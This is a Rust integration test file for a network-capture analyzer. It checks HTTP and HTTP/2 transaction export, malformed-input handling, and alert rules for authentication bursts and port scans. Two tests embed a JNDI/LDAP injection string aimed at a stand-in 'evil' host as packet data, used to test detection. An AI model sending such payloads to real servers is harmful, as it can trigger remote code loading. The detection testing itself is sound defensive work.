#[path = "support/http2.rs"]
mod http2;
#[path = "support/http.rs"]
mod support;

use packrat_tui::{export::pcapng::PcapNgWriter, net::packet::CaptureMetadata};
use serde_json::Value;
use std::{
    path::Path,
    process::{Command, Output},
};

fn run(path: &Path) -> Output {
    run_with(path, &[])
}

fn run_with(path: &Path, options: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .args(options)
        .arg(path)
        .env_remove("TERM")
        .env("HOME", "/nonexistent")
        .output()
        .unwrap()
}

fn read_events(output: &Output) -> Vec<Value> {
    String::from_utf8(output.stdout.clone())
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect()
}

fn events(output: &Output) -> Vec<Value> {
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    read_events(output)
}

#[test]
fn capture_to_transactions_runs_without_a_terminal_or_user_config() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("exchange.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x02, &[], false))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            2,
            101,
            0x18,
            b"GET /headless HTTP/1.1\r\nHost: example\r\n\r\n",
            false,
        ))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            3,
            500,
            0x18,
            b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok",
            true,
        ))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let conversation = events
        .iter()
        .find(|value| value["type"] == "http_conversation")
        .unwrap();
    let transaction = &conversation["conversation"]["transactions"][0];
    assert_eq!(transaction["request"]["target"], "/headless");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([2])
    );
    assert_eq!(transaction["response"]["status"], 200);
    let summary = events.last().unwrap();
    assert_eq!(summary["type"], "summary");
    assert_eq!(summary["packets"], 3);
    assert_eq!(summary["analyzed"], 3);
    assert_eq!(summary["http_exchanges"], 1);
    assert_eq!(summary["containment"], "disabled");
    assert_eq!(summary["transaction_scope"], "retained_streams_only");
}

#[test]
fn cleartext_http2_capture_is_exported_as_multiplexed_exchanges() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("http2.pcapng");
    let stream = http2::stream(
        &http2::frame(1, 5, 1, &http2::request(b"/h2")),
        &http2::frame(1, 5, 1, &[0x88]),
    );
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x18, &stream.client_data, false))
        .unwrap();
    writer
        .write_packet(&support::tcp(2, 500, 0x18, &stream.server_data, true))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let event = events
        .iter()
        .find(|event| event["type"] == "http2_conversation")
        .unwrap();
    let transaction = &event["conversation"]["transactions"][0];
    assert_eq!(transaction["stream_id"], 1);
    assert_eq!(transaction["response"]["state"], "Complete");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([1])
    );
    assert_eq!(events.last().unwrap()["http2_exchanges"], 1);
}

#[test]
fn critical_detection_is_reported_without_enforcement() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("incident.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert!(events.iter().any(|value| value["type"] == "incident"));
    assert!(events.last().unwrap()["incidents"].as_u64().unwrap() > 0);
    assert_eq!(events.last().unwrap()["containment"], "disabled");
}

#[test]
fn unsupported_link_types_are_reported_not_silently_analyzed() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("unsupported.pcapng");
    let mut packet = support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false);
    packet.capture = Some(CaptureMetadata {
        timestamp: Some(packrat_tui::net::packet::CaptureTimestamp {
            ticks: 1,
            resolution: packrat_tui::net::packet::TimestampResolution::Decimal(0),
            offset_seconds: 0,
        }),
        captured_length: packet.bytes.len() as u32,
        wire_length: packet.bytes.len() as u32,
        link_type: 101,
        interface_id: 0,
        section_id: 0,
        interface_name: None,
        comments: vec![],
    });
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer.write_packet(&packet).unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert_eq!(events[0]["type"], "skipped_packet");
    assert_eq!(events[0]["reason"]["UnsupportedLinkType"], 101);
    assert_eq!(events.last().unwrap()["skipped"], 1);
    assert_eq!(events.last().unwrap()["incidents"], 0);
    let replay = run_with(&path, &["--expect-alert-frame", "scan.horizontal=1"]);
    assert!(!replay.status.success());
    assert_eq!(read_events(&replay).last().unwrap()["alert_expectations"]["verdict"], "inconclusive");
}

#[test]
fn malformed_capture_and_extra_arguments_fail_without_a_success_summary() {
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), b"not a pcap file").unwrap();
    let output = run(file.path());
    assert!(!output.status.success());
    assert!(!String::from_utf8_lossy(&output.stdout).contains("summary"));
    let output = Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .args(["x", "--contain"])
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(String::from_utf8_lossy(&output.stderr).contains("Unknown option: --contain"));
}

#[test]
fn labeled_http_replay_distinguishes_retransmissions_from_distinct_responses() {
    let directory = tempfile::tempdir().unwrap();
    let benign = directory.path().join("benign.pcapng");
    let suspicious = directory.path().join("auth-bursts.pcapng");
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let mut writer = PcapNgWriter::create(&benign).unwrap();
    for no in 1..=5 {
        writer.write_packet(&support::tcp(no, 100, 0x18, response, true)).unwrap();
    }
    writer.flush().unwrap();
    let benign_run = run_with(&benign, &["--expect-alert", "http.unauthorized_burst=0"]);
    assert_eq!(events(&benign_run).last().unwrap()["alert_expectations"]["verdict"], "passed");

    let mut writer = PcapNgWriter::create(&suspicious).unwrap();
    for no in (1..=5).chain(40..=44) {
        writer.write_packet(&support::tcp(no, no as u32 * 100, 0x18, response, true)).unwrap();
    }
    writer.flush().unwrap();
    let options = ["--expect-alert", "http.unauthorized_burst=1", "--expect-alert", "scan.horizontal=0"];
    let first = run_with(&suspicious, &options);
    let second = run_with(&suspicious, &options);
    assert_eq!(first.stdout, second.stdout);
    let replay_events = events(&first);
    let auth: Vec<_> = replay_events.iter()
        .filter(|e| e["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
        .collect();
    assert_eq!(auth.len(), 2);
    assert_eq!(auth[0]["alert"]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
    assert_eq!(auth[1]["alert"]["id"], auth[0]["alert"]["id"]);
    assert_eq!(auth[1]["alert"]["hit_count"], 2);
    let summary = replay_events.last().unwrap();
    assert_eq!(summary["rule_counts"]["http.unauthorized_burst"], 1);
    assert_eq!(summary["alert_expectations"]["verdict"], "passed");

    let frame = run_with(&suspicious, &["--expect-alert-frame", "http.unauthorized_burst=5"]);
    let frame_events = events(&frame);
    let report = &frame_events.last().unwrap()["alert_expectations"];
    assert_eq!(report["verdict"], "passed");
    assert_eq!(report["frame_checks"][0]["expected_frames"], serde_json::json!([5]));
    assert_eq!(report["frame_checks"][0]["unexpected_openings"], 0);

    // A correlated update at frame 10 is not an opening; the grouped count
    // alone is still correct and would not catch this wrong label.
    let wrong_frame = run_with(&suspicious, &[
        "--expect-alert", "http.unauthorized_burst=1",
        "--expect-alert-frame", "http.unauthorized_burst=10",
    ]);
    assert!(!wrong_frame.status.success());
    let wrong_frame_events = read_events(&wrong_frame);
    let report = &wrong_frame_events.last().unwrap()["alert_expectations"];
    assert_eq!(report["verdict"], "failed");
    assert_eq!(report["checks"][0]["observed"], 1);
    assert_eq!(report["frame_checks"][0]["missing_frames"], serde_json::json!([10]));
    assert_eq!(report["frame_checks"][0]["unexpected_openings"], 1);

    for (labels, error) in [
        (vec!["--expect-alert-frame", "http.unauthorized_burst=0"], "Invalid expected alert frame"),
        (vec!["--expect-alert-frame", "http.unauthorized_burst=5",
              "--expect-alert-frame", "http.unauthorized_burst=5"], "Duplicate alert frame expectation"),
    ] {
        let invalid = run_with(&suspicious, &labels);
        assert!(!invalid.status.success());
        assert!(String::from_utf8_lossy(&invalid.stderr).contains(error));
    }

    let mismatch = run_with(&suspicious, &["--expect-alert", "http.unauthorized_burst=0"]);
    assert!(!mismatch.status.success());
    assert_eq!(read_events(&mismatch).last().unwrap()["alert_expectations"]["verdict"], "failed");
    let typo = run_with(&suspicious, &["--expect-alert", "http.unregistered=0"]);
    assert!(!typo.status.success());
    assert!(String::from_utf8_lossy(&typo.stderr).contains("Unknown alert rule ID"));
}

#[test]
fn http_burst_replay_counts_reordered_responses_only_within_the_active_window() {
    let directory = tempfile::tempdir().unwrap();
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    for (label, times, count) in [
        ("reordered", [100.0, 102.0, 101.0, 103.0, 104.0], 1),
        ("too-old", [100.0, 102.0, 70.0, 103.0, 104.0], 0),
    ] {
        let path = directory.path().join(format!("{label}.pcapng"));
        let mut writer = PcapNgWriter::create(&path).unwrap();
        for (index, timestamp) in times.into_iter().enumerate() {
            let frame = index as u64 + 1;
            let mut packet = support::tcp(frame, frame as u32 * 100, 0x18, response, true);
            packet.timestamp = timestamp;
            writer.write_packet(&packet).unwrap();
        }
        writer.flush().unwrap();

        let expected = format!("http.unauthorized_burst={count}");
        let replay = run_with(&path, &["--expect-alert", &expected]);
        let rows = events(&replay);
        assert_eq!(rows.last().unwrap()["alert_expectations"]["verdict"], "passed");
        if count == 1 {
            let alert = rows.iter().find(|row| row["type"] == "alert").unwrap();
            assert_eq!(alert["alert"]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
        }
    }
}

#[test]
fn http_burst_replay_keeps_sustained_traffic_grouped_and_records_a_renewed_burst() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("renewed-auth-burst.pcapng");
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let mut writer = PcapNgWriter::create(&path).unwrap();
    for (index, timestamp) in [10.0, 10.1, 20.0, 20.1, 20.2, 42.0, 42.1, 58.0, 72.2, 72.3, 72.4, 72.5]
        .into_iter().enumerate()
    {
        let frame = index as u64 + 1;
        let mut packet = support::tcp(frame, frame as u32 * 100, 0x18, response, true);
        packet.timestamp = timestamp;
        writer.write_packet(&packet).unwrap();
    }
    writer.flush().unwrap();

    let output = run_with(&path, &["--expect-alert", "http.unauthorized_burst=1"]);
    let rows = events(&output);
    let auth: Vec<_> = rows.iter()
        .filter(|row| row["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
        .map(|row| &row["alert"])
        .collect();
    assert_eq!(auth.len(), 2);
    assert_eq!(auth[0]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
    assert_eq!(auth[1]["id"], auth[0]["id"]);
    assert_eq!(auth[1]["hit_count"], 2);
    assert_eq!(auth[1]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5, 8, 9, 10, 11, 12]));
}

#[test]
fn labeled_scan_replay_differentiates_unique_targets_from_repeat_traffic() {
    let directory = tempfile::tempdir().unwrap();
    for (label, diverse) in [("repeated", false), ("fanout", true)] {
        let path = directory.path().join(format!("{label}.pcapng"));
        let mut writer = PcapNgWriter::create(&path).unwrap();
        for no in 1..=12 {
            let mut packet = support::tcp(no, no as u32 * 100, 0x02, &[], false);
            packet.bytes[33] = if diverse { no as u8 + 10 } else { 2 };
            writer.write_packet(&packet).unwrap();
        }
        writer.flush().unwrap();
        let expected = if diverse { "scan.horizontal=1" } else { "scan.horizontal=0" };
        let replay = run_with(&path, &["--expect-alert", expected]);
        assert_eq!(events(&replay).last().unwrap()["alert_expectations"]["verdict"], "passed");
    }
}
